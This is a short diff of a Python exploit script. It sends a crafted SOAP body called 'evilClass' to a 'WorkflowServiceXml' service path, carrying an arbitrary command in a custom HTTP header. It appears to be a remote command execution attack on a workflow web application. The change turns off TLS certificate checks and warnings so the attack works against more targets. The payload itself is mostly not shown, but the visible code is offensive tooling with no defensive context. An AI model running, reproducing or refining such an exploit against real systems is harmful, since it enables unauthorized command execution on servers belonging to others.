@@ -2,6 +2,9 @@
 # -*- coding: UTF-8 -*-
 import requests
 import sys
+import urllib3
+urllib3.disable_warnings()
+
 
 def hack(url,cmd):
     headers = {"Content-Type": "text/xml","Neorah":cmd}
@@ -15,7 +18,7 @@ def hack(url,cmd):
    </soapenv:Body>
 </soapenv:Envelope>'''
     url=url+"/services%20/WorkflowServiceXml"
-    response = requests.post(url,data=evilClass,headers=headers,allow_redirects=False)
+    response = requests.post(url,data=evilClass,headers=headers,allow_redirects=False,verify=False)
     if response.status_code == 500:
       return response.text
     elif response.status_code == 404:
